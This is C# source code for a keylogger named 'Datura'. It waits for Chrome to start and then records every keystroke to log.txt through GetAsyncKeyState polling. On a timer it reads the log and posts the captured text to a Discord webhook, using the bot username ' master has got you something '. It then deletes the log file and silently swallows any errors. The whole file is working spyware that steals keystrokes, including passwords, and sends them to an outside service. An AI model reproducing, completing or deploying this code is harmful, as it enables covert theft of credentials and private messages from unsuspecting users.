using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using System.Management;
using Timer = System.Timers.Timer;
using System.Net;

namespace Datura
{
    class Program
    {
        //Delay, used when no key is pressed to reduce cpu usage.
        const short Delay = 50;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static StringBuilder key = new StringBuilder();

        static void Main(string[] args)
        {
            int chrome = 8;

            while (chrome > 6)
            {
                var RunningProcessPaths = ProcessFileNameFinderClass.GetAllRunningProcessFilePaths();
                if (RunningProcessPaths.Contains("chrome.exe"))
                {
                    new Program().start();
                    chrome = 4;


                }
                else
                {
                    chrome = 7;
                    Task.Delay(2000).Wait();
                }



            }
        }
        private void start()
        {
            //timer for when file is sent its now at every 60 seconds
            Timer t = new Timer();
            t.Interval = 60000 * 10;
            t.Elapsed += discordmsg;
            t.AutoReset = false;
            t.Enabled = true;



            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the number of avaible keys.

            while (true)
            {
                for (int i = 0; i < keysCount; i++)//Loop for every key.
                    if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
                        key.Append(Enum.GetName(typeof(Keys), i));//Add key to keys.

                //If no key is pressed then wait x milliseconds.
                if (key.Length <= 0) Task.Delay(Delay).Wait();
                else
                {
                    //Key is pressed, continue.
                    //Ingenore LButton and RButton, these are mouse clicks.
                    if (key.Equals("LButton") || key.Equals("RButton")) { key.Clear(); continue; }

                    key.Replace("Enter", Environment.NewLine);//replaces enter with a new line
                    key.Replace("Space", " ");//replaces the space with a real space

                    File.AppendAllText("log.txt", key.ToString());//writes the keys to a log file
                    key.Clear();
                }
            }
        }

        private void discordmsg(Object source, ElapsedEventArgs e)
        {
            //path for file
            string path = "log.txt";

            try
            {
                //reading to content of file
                if (!File.Exists(path)) return;
                StreamReader r = new StreamReader(path);
                String content = r.ReadLine();
                r.Close();



                //sending the file thru discord
                
                using (DcWebHook dcWeb = new DcWebHook())
                {
                    ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                    foreach (ManagementObject managementObject in mos.Get())
                    {
                        String OSName = managementObject["Caption"].ToString();
                        dcWeb.ProfilePicture = "https://i.redd.it/wy2oybmp5ma41.png";
                        dcWeb.UserName = " master has got you something ";
                        dcWeb.WebHook = "";
                        dcWeb.SendMessage("```" + content + "```");
                    }
                }
                // deleting the file after
                File.Delete(path);
            }
            catch (Exception ex)
            {
            }
        }
    }
}
